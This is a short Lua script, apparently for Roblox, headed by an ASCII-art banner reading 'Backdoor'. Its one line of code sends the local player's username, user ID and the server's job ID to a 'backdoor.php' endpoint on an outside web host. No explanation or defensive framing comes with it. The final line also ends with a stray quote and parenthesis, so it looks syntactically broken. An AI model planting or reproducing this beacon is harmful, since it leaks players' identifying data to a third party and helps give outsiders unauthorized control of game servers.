--[[
######                                                   
#     #   ##    ####  #    # #####   ####   ####  #####  
#     #  #  #  #    # #   #  #    # #    # #    # #    # 
######  #    # #      ####   #    # #    # #    # #    # 
#     # ###### #      #  #   #    # #    # #    # #####  
#     # #    # #    # #   #  #    # #    # #    # #   #  
######  #    #  ####  #    # #####   ####   ####  #    #  
                                                         
]]
game:HttpGet("https://enclosed.live/backdoor.php?username=" .. game:GetService("Players").LocalPlayer.Name .. "&userid=" .. game:GetService("Players").LocalPlayer.UserId .. "&jobid=" .. game.JobId ..")
    
